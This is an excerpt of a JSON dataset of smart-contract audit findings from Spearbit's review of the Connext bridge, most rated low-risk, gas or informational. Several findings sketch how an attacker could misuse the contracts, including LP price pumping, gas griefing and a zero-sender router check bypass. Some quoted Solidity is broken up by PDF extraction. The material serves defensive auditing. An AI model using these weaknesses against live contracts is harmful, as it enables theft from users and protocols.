        "body": "The function setAdmin() transfer ownership to a new address. In case a wrong address is supplied ownership is inaccessible. The same issue occurs with transferOwnership of OwnableUpgradeable in several Nomad contracts. Additionally the Nomad contract try to prevent renounceOwnership, however, this can also be accomplished with transferOwnership to a non existing address. Relevant Nomad contracts:  TokenRegistry.sol  NomadBase.sol  UpdaterManager.sol  XAppConnectionManager.sol 29 contract ConnextPriceOracle is PriceOracle { ... function setAdmin(address newAdmin) external onlyAdmin { address oldAdmin = admin; admin = newAdmin; emit NewAdmin(oldAdmin, newAdmin); } } contract BridgeRouter is Version0, Router { ... /** * @dev should be impossible to renounce ownership; * * */ we override OpenZeppelin OwnableUpgradeable's implementation of renounceOwnership to make it a no-op function renounceOwnership() public override onlyOwner { // do nothing } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function removeRouter does not clear approvedForPortalRouters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function removeRouter() clears most of the fields of the struct RouterPermissionsManagerInfo except for approvedForPortalRouters. However, it is still good to also remove approvedForPortalRouters in removeRouter() because if the router were to be added again later (via setupRouter() ) or _isRouterOwnershipRenounced is set in the future, the router would still have the old approvedForPortalRouters. 30 struct RouterPermissionsManagerInfo { mapping(address => bool) approvedRouters; // deleted mapping(address => bool) approvedForPortalRouters; // not deleted mapping(address => address) routerRecipients; // deleted mapping(address => address) routerOwners; // deleted mapping(address => address) proposedRouterOwners; // deleted mapping(address => uint256) proposedRouterTimestamp; // deleted } contract RoutersFacet is BaseConnextFacet { function removeRouter(address router) external onlyOwner { ... s.routerPermissionInfo.approvedRouters[router] = false; ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... delete s.routerPermissionInfo.proposedRouterOwners[router]; delete s.routerPermissionInfo.proposedRouterTimestamp[router]; } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Anyone can self burn lp token of the AMM",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When providing liquidity into the AMM pool, users get LP tokens. Users can redeem their shares of the liquidity by redeeming LP to the AMM pool. The current LPToken contract inherits Openzepplins ERC20BurnableUpgradeable. Users can burn their tokens by calling burn without notifying the AMM pools. ERC20BurnableUpgradeable.sol#L26-L28. Although users do not profit from this action, it brings up concerns such as:  An exploiter has an easy way to pump the LP price. Burning LP is similar to donating value to the pool. While its good for the pool, this gives the exploiter another tool to break other protocols. After the cream finance attack many protocols started to take extra caution and made this a restricted function (absorbing donation) github.com/yearn/yearn-security/blob/master/disclosures/2021-10-27.md.  Against the best practice. Every state of an AMM is related to price. Allowing external actors to change the AMM states without notifying the main contract is dangerous. Its also harder for a developer to build other novel AMM based on the same architecture. Note: the burn function is also not protected by nonReentrant or whenNotPaused.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Skip timeout in diamondCut() (edge case)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Edge case: If someone manages to get an update through which deletes all facets then the next update skips the delay (because ds.facetAddresses.length will be 0). library LibDiamond { function diamondCut(...) ... { ... if (ds.facetAddresses.length != 0) { uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); } // Otherwise, this is the first instance of deployment and it can be set automatically ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit gas for s.executor.execute()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The call to s.executor.execute() in BridgeFacet might use up all available gas. In that case, the call to callback to report to the originator might not be called because the execution stops due an out of gas error. Note: the execute() function might be retried by the relayer so perhaps this will fix itself eventually. Note: excessivelySafeCall in Executor does limit the amount of gas. contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory returnData) = s.executor.execute(...); // might use all available ,! gas ... // If callback address is not zero, send on the PromiseRouter if (_args.params.callback != address(0)) { s.promiseRouter.send(...); // might not have enough gas } ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Several external functions missing whenNotPaused mofifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The following functions dont have a whenNotPaused modifier while most other external functions do.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet. Without whenNotPaused these functions can still be executed when the protocol is paused.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gas griefing attack on callback execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When the callback is executed on the source chain the following line can revert or consume all forwarded gas. In this case, the relayer wastes gas and doesnt get the callback fee. ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData());",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Callback fails when returnData is empty",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If a transfer involves a callback, PromiseRouter reverts if returnData is empty. if (_returnData.length == 0) revert PromiseRouter__send_returndataEmpty(); However, the callback should be allowed in case the user wants to report the calldata execution success on the destination chain (_returnSuccess).",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redundant fee on transfer logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function repayAavePortalFor() has logic for fee on transfer tokens. However, handleIncomin- gAsset() doesnt allow fee on transfer tokens. So this extra code shouldnt be necessary in repayAavePortal- For(). function repayAavePortalFor(...) ... { ... (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // If this was a fee on transfer token, reduce the total if (amount < total) { uint256 missing; unchecked { missing = total - amount; } if (missing < _feeAmount) { // Debit fee amount unchecked { _feeAmount -= missing; } } else { // Debit backing amount unchecked { missing -= _feeAmount; } _feeAmount = 0; _backingAmount -= missing; } } ... } library AssetLogic { function handleIncomingAsset(...) ... { ... // Transfer asset to contract trueAmount = transferAssetToContract(_assetId, _assetAmount); .... } function transferAssetToContract(address _assetId, uint256 _amount) internal returns (uint256) { ... // Validate correct amounts are transferred uint256 starting = IERC20(_assetId).balanceOf(address(this)); SafeERC20.safeTransferFrom(IERC20(_assetId), msg.sender, address(this), _amount); // Ensure this was not a fee-on-transfer token if (IERC20(_assetId).balanceOf(address(this)) - starting != _amount) { revert AssetLogic__transferAssetToContract_feeOnTransferNotSupported(); } ... } } 34",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Some gas can be saved in reimburseLiquidityFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Some gas can be saved by assigning tokenExchange before the if statement. This also improves readability. function reimburseLiquidityFees(...) ... { ... if (address(tokenExchanges[_token]) != address(0)) { // could use `tokenExchange` ITokenExchange tokenExchange = tokenExchanges[_token]; // do before the if }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "LIQUIDITY_FEE_DENOMINATOR could be a constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The value of LIQUIDITY_FEE_DENOMINATOR seems to be constant. However, it is currently stored in s and requires an SLOAD operation to retrieve it, increasing gas costs. upgrade-initializers/DiamondInit.sol: BridgeFacet.sol: BridgeFacet.sol: PortalFacet.sol: AssetLogic.sol: s.LIQUIDITY_FEE_DENOMINATOR = 10000; toSwap = _getFastTransferAmount(..., s.LIQUIDITY_FEE_DENOMINATOR); s.portalFeeDebt[_transferId] = ... / s.LIQUIDITY_FEE_DENOMINATOR; if (_aavePortalFeeNumerator > s.LIQUIDITY_FEE_DENOMINATOR) ... uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Access elements from storage array instead of loading them in memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "SwapUtils.removeLiquidityOneToken() function only needs the length and one element of the storage array self.pooledTokens. For this, the function reads the entire array in memory which costs extra gas. IERC20[] memory pooledTokens = self.pooledTokens; ... uint256 numTokens = pooledTokens.length; ... pooledTokens[tokenIndex].safeTransfer(msg.sender, dy); 35",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Send information through calldata instead of having callee query Executor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Executor.originSender(), Executor.origin(), and Executor.amount() to permission crosschain calls. This costs extra gas because of staticcalls made to an external contract.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "AAVE portal debt might not be repaid in full if debt is converted to interest paying",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Aave portal mechanism gives routers access to a limited amount of unbacked debt which is to be used when fronting liquidity for cross-chain transfers. The process for receiving unbacked debt is as follows:  During message execution, the protocol checks if a single liquidity provider has bid on a liquidity auction which is handled by the relayer network.  If the provider has insufficient liquidity, the protocol attempts to utilize AAVE unbacked debt by minting uncol- lateralised aTokens and withdrawing them from the pool. The withdrawn amount is immediately used to pay out the recipient of the bridge transfer.  Currently the debt is fixed fee, see arc-whitelist-connext-for-v3-portals, however this might be changed in the future out of band.  Incase this would be changed: upon repayment, AAVE will actually expect unbackedDebt + fee + aToken interest. The current implementation will only track unbackedDebt + fee, hence, the protocol will accrue bad debt in the form of interest. Eventually, the extent of this bad debt will reach a point where the unbacked- MintCap has been reached and noone is able to pay off this debt. I consider this to be a long-term issue that could be handled in a future upgrade, however, it is important to highlight and address these issues early.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Routers pay the slippage cost for users when using AAVE credit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers do the fast of adopted token and _fastTransferAmount = * _fastTransferAmount /s.LIQUIDITY_FEE_DENOMINATOR _args.amount * s.LIQUIDITY_FEE_NUMERATOR / s.LIQUIDITY_FEE_DENOMINATOR. The routers get reimbursed _args.amount of local tokens afterward. Thus, the routers lose money if the slippage of swapping between local tokens and adopted tokens are larger than the liquidityFee. function _executePortalTransfer( bytes32 _transferId, bytes32 _canonicalId, uint256 _fastTransferAmount, address _router ) internal returns (uint256, address) { // Calculate local to adopted swap output if needed address adopted = s.canonicalToAdopted[_canonicalId]; ,! ,! ,! IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); // Improvement: Instead of withdrawing to address(this), withdraw directly to the user or executor to save 1 transfer uint256 amountWithdrawn = IAavePool(s.aavePool).withdraw(adopted, _fastTransferAmount, address(this)); if (amountWithdrawn < _fastTransferAmount) revert BridgeFacet__executePortalTransfer_insufficientAmountWithdrawn(); // Store principle debt s.portalDebt[_transferId] = _fastTransferAmount; // Store fee debt s.portalFeeDebt[_transferId] = (s.aavePortalFeeNumerator * _fastTransferAmount) / s.LIQUIDITY_FEE_DENOMINATOR; ,! emit AavePortalMintUnbacked(_transferId, _router, adopted, _fastTransferAmount); return (_fastTransferAmount, adopted); }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimize max checks in initializeSwap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function initializeSwap() reverts if a value is >= ...MAX.... Probably should revert when > ...MAX.... function initializeSwap(...) ... { ... // Check _a, _fee, _adminFee, _withdrawFee parameters if (_a >= AmplificationUtils.MAX_A) revert SwapAdminFacet__initializeSwap_aExceedMax(); if (_fee >= SwapUtils.MAX_SWAP_FEE) revert SwapAdminFacet__initializeSwap_feeExceedMax(); if (_adminFee >= SwapUtils.MAX_ADMIN_FEE) revert SwapAdminFacet__initializeSwap_adminFeeExceedMax(); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "All routers share the same AAVE debt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The mintUnbacked amount is allocated to the calling contract (eg the Connext Diamond that has the BRIDGE role permission). Thus it is not separated to different routers, if one router does not payback its debt (in time) and has the max debt then this facility cannot be used any more. function _executePortalTransfer( ... ) ... { ... IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful with fee on transfer tokens on AAVE loans",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Aave function backUnbacked() does not account for fee on transfer tokens. If these happen to be used then the accounting might not be right. function _backLoan(...) ... { ... // back loan IAavePool(s.aavePool).backUnbacked(_asset, _backing, _fee); ... } library BridgeLogic { function executeBackUnbacked(... ) ... { ... reserve.unbacked -= backingAmount.toUint128(); reserve.updateInterestRates(reserveCache, asset, added, 0); IERC20(asset).safeTransferFrom(msg.sender, reserveCache.aTokenAddress, added); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Let getTokenPrice() also return the source of the price info",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function getTokenPrice() can get its prices information from multiple sources. For the caller it might be important to know which source was used. function getTokenPrice(address _tokenAddress) public view override returns (uint256) { }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos in the comments of _swapAsset() and _swapAssetOut()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "There are typos in the comments of _swapAsset() and _swapAssetOut(): * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAsset(... ) ... * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAssetOut(...) ...",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consistently delete array entries in PromiseRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "In function process() of PromiseRouter.sol two different ways are used to clear a value: one with delete and the other with = 0. Although technically the same it better to use the same method to maintain consistency. function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // remove message delete messageHashes[transferId]; // remove callback fees callbackFees[transferId] = 0; ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "getTokenPrice() will revert if setDirectPrice() is set in the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The setDirectPrice() function allows the protocol admin to update the price up to two seconds in the future. This impacts the getTokenPrice() function as the updated value may be slightly incorrect.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Roundup in words not optimal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function words, which is used in the Nomad code base, tries to do a round up. Currently it adds 1 to the len. /** * @notice * @param memView * @return */ The number of memory words this memory view occupies, rounded up. The view uint256 - The number of memory words function words(bytes29 memView) internal pure returns (uint256) { return uint256(len(memView)).add(32) / 32; }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "callback could have capped returnData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function execute() caps the result of the call to excessivelySafeCall to a maximum of MAX_- COPY bytes, making sure the result is small enough to fit in a message sent back to the originator. However, when the callback is done the originator needs to be aware that the data can be capped and this fact is not clearly documented. 41 function execute(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); } function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // execute callback ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData()); // returnData is capped ... ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Several external functions are not nonReentrant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The following functions dont have nonReentrant, while most other external functions do have such modifier.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet.  initiateClaim of RelayerFacet. There are many swaps in the protocol and some of them should be conducted in an aggregator (not yet imple- mented). A lot of the aggregators use the difference between pre-swap balance and post-swap balance. (e.g. uniswap v3 router , 1inch, etc.. ). While this isnt exploitable yet, there is a chance that future updates might open up an issue to exploit.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "NomadFacet.reconcile() has an unused argument canonicalDomain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "NomadFacet.reconcile() has an unused argument canonicalDomain.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "SwapUtils._calculateSwap() returns two values with different precision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "SwapUtils._calculateSwap() returns (uint256 dy, uint256 dyFee). dy is the amount of tokens a user will get from a swap and dyFee is the associated fee. To account for the different token decimal precision between the two tokens being swapped, a multipliers mapping is used to bring the precision to the same value. To return the final values, dy is changed back to the original token precision but dyFee is not. This is an internal function and the callers adjust the fee precision back to normal, therefore severity is informa- tional. But without documentation it is easy to miss.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multicall.sol not compatible with Natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Multicall.sol Natspec comment specifies: /// @title Multicall - Aggregate results from multiple read-only function calls However, to call those functions it uses a low level call() method which can call write functions as well. (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "reimburseRelayerFees only what is necessary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function reimburseRelayerFees() gives a maximum of relayerFeeCap to a receiver, unless it already has a balance of relayerFeeCap. This implicitly means that a balance relayerFeeCap is sufficient. So if a receiver already has a balance only relayerFeeCap - _to.balance is required. This way more recipients can be reimbursed with the same amount of funds in the SponsorVault. function reimburseRelayerFees(...) ... { ... if (_to.balance > relayerFeeCap || Address.isContract(_to)) { // Already has fees, and the address is a contract return; } ... sponsoredFee = sponsoredFee >= relayerFeeCap ? relayerFeeCap : sponsoredFee; ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "safeIncreaseAllowance and safeDecreaseAllowance can be replaced with safeApprove in _recon- cileProcessPortal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The NomadFacet uses safeIncreaseAllowance after clearing the allowance. creaseAllowance to clear the allowance. Using safeApprove is potentially safer in this case. Some non-standard tokens only allow the allowance to change from zero, or change to zero. Using safeDecreaseAllowance would potentially break the contract in a future update. Note that SafeApprove has been deprecated for the concern of a front-running attack. It is only supported when setting an initial allowance or setting the allowance to zero SafeERC20.sol#L38",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event not emitted when ERC20 and native asset is transferred together to SponsorVault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Any ERC20 token or native asset can be transferred to SponsorVault contract by calling the de- posit() function. It emits a Deposit() event logging the transferred asset and the amount. However, if the native asset and an ERC20 token are transferred in the same call only a single event corresponding to the ERC20 transfer is emitted.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "payable keyword can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If a function does not need to have the native asset sent to it it is recommended to not mark it as payable and avoid any funds getting. StableSwapFacet.sol has two payable functions: swapExact() and swapExactOut, which only swap ERC20 tokens and are not expected to receive the native asset.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve variable naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Two different variables/functions with an almost identical name are prone to error. Variable names like _routerOwnershipRenounced and _assetOwnershipRenounced do not correctly reflect their meaning as they actually refer to the ownership whitelist being renounced. 45 function _isRouterOwnershipRenounced() internal view returns (bool) { return LibDiamond.contractOwner() == address(0) || s._routerOwnershipRenounced; } /** * @notice Indicates if the ownership of the asset whitelist has * been renounced */ function _isAssetOwnershipRenounced() internal view returns (bool) { ... bool _routerOwnershipRenounced; ... // 27 bool _assetOwnershipRenounced; The constant EMPTY is defined twice with different values. This is confusing and could lead to errors. contract BaseConnextFacet { ... bytes32 internal constant EMPTY = hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\"; ... ,! } library LibCrossDomainProperty { ... bytes29 public constant EMPTY = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"; ... } The function xcall() uses both _args.transactingAssetId and transactingAssetId. two, but they each have a very specific meaning and missing it introduces problems. It is easy to mix these function xcall(...) ... { ... address transactingAssetId = _args.transactingAssetId == address(0) ? address(s.wrapper) : _args.transactingAssetId; ... (, uint256 amount) = AssetLogic.handleIncomingAsset( _args.transactingAssetId, ... ); ... (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( ..., transactingAssetId, ... ); ... } In the _handleExecuteTransaction function of BridgeFacet, _args.amount and _amount are used. In this func- tion:  _args.amount is equal to bridged_amount; 46  _amount is equal to bridged_amount - liquidityFee (and potentially swapped amount).",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "onlyRemoteRouter can be circumvented",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "BaseConnextFacet-fix. However, the change has not been applied to Router.sol#L56-L58 which is currently in use. The modifier onlyRemoteRouter() can be mislead if the sender parameter has the value 0. The modifier uses _m.sender() from the received message by Nomad. Assuming all checks of Nomad work as expected this value cannot be 0 as it originates from a msg.sender in Home.sol. contract Replica is Version0, NomadBase { function process(bytes memory _message) public returns (bool _success) { ... bytes29 _m = _message.ref(0); ... // ensure message has been proven bytes32 _messageHash = _m.keccak(); require(acceptableRoot(messages[_messageHash]), \"!proven\"); ... IMessageRecipient(_m.recipientAddress()).handle( _m.origin(), _m.nonce(), _m.sender(), _m.body().clone() ); ... } } contract BridgeRouter is Version0, Router { function handle(uint32 _origin,uint32 _nonce,bytes32 _sender,bytes memory _message) external override onlyReplica onlyRemoteRouter(_origin, _sender) { ... } } abstract contract Router is XAppConnectionClient, IMessageRecipient { ... modifier onlyRemoteRouter(uint32 _origin, bytes32 _router) { require(_isRemoteRouter(_origin, _router), \"!remote router\"); _; } function _isRemoteRouter(uint32 _domain, bytes32 _router) internal view returns (bool) { return remotes[_domain] == _router; // if _router == 0 then this is true for random _domains } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some dust not accounted for in reconcile()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteLiquidity() in BridgeFacet takes care of rounding issues in toSwap / pathLen. However, the inverse function reconcile() in NomadFacet() does not do that. So, tiny amounts of tokens (dust) are not accounted for in reconcile(). contract BridgeFacet is BaseConnextFacet { ... function _handleExecuteLiquidity(...) ... { ... // For each router, assert they are approved, and deduct liquidity. uint256 routerAmount = toSwap / pathLen; for (uint256 i; i < pathLen - 1; ) { s.routerBalances[_args.routers[i]][_args.local] -= routerAmount; unchecked { ++i; } } // The last router in the multipath will sweep the remaining balance to account for remainder ,! dust. uint256 toSweep = routerAmount + (toSwap % pathLen); s.routerBalances[_args.routers[pathLen - 1]][_args.local] -= toSweep; } } } contract NomadFacet is BaseConnextFacet { ... function reconcile(...) ... { ... uint256 routerAmt = toDistribute / pathLen; for (uint256 i; i < pathLen; ) { s.routerBalances[routers[i]][localToken] += routerAmt; unchecked { ++i; } } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful with the decimals of BridgeTokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The BridgeRouter sends token details including the decimals() over the nomad bridge to configure a new deployed token. After setting the hash with setDetailsHash() anyone can call setDetails() on the token to set the details. The decimals() are mainly used for user interfaces so it might not be a large problem when the setDetails() is executed at later point in time. However initializeSwap() also uses decimals(), this is called via offchain code. In the example code of initializeSwap.ts it retrieves the decimals() from the deployed token on the destination chain. This introduces a race condition between setDetails() and initializeSwap.ts, depending on which is executed first, the swaps will have different results. Note: It could also break the ConnextPriceOracle contract BridgeRouter is Version0, Router { ... function _send( ... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... // query token contract for details and calculate detailsHash _detailsHash = BridgeMessage.getDetailsHash(_t.name(), _t.symbol(), _t.decimals()); } else { ... } } function _handleTransfer(...) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... } else { ... IBridgeToken(_token).setDetailsHash(_action.detailsHash()); // so hash is set now } } } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function setDetails(..., uint8 _newDecimals) ... { // can be called by anyone ... require( _isFirstDetails || BridgeMessage.getDetailsHash(..., _newDecimals) == detailsHash, \"!committed details\" ); ... token.decimals = _newDecimals; ... } } Example script: initializeSwap.ts 49 const decimals = await Promise.all([ (await ethers.getContractAt(\"TestERC20\", local)).decimals(), (await ethers.getContractAt(\"TestERC20\", adopted)).decimals(), // setDetails might not have ,! been done ]); const tx = await connext.initializeSwap(..., decimals, ... ); ); contract SwapAdminFacet is BaseConnextFacet { ... function initializeSwap(..., uint8[] memory decimals, ... ) ... { ... for (uint8 i; i < numPooledTokens; ) { ... precisionMultipliers[i] = 10**uint256(SwapUtils.POOL_PRECISION_DECIMALS - decimals[i]); ... } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about ERC20 approval to zero-address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The linked code notes in a comment: // NOTE: if pool is not registered here, then the approval will fail // as it will approve to the zero-address SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); This is not always true. The ERC20 spec doesnt have this restriction and ERC20 tokens based on solmate also dont revert on approving to zero-address. There is no risk here as the following line of code for zero-address pools will revert. return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut);",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native asset is delivered even if the wrapped asset is transferred",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Connext delivers the native asset on the destination chain even if the wrapped asset was transferred. This is because on the source chain the native asset is converted to the wrapped asset, and then the distinction is lost. On the destination chain it is not possible to know which of these two assets was transferred, and hence a choice is made to transfer the native asset. if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ...",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Entire transfer amount is borrowed from AAVE Portal when a router has insufficient balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If the router picked by the Sequencer doesnt have enough balance to transfer the required amount, it can borrow the entire amount from Aave Portal. For a huge amount, it will block borrowing for other routers since there is a limit on the total maximum amount that can be borrowed.",
        "labels": [
            "Spearbit",
            "Connext",
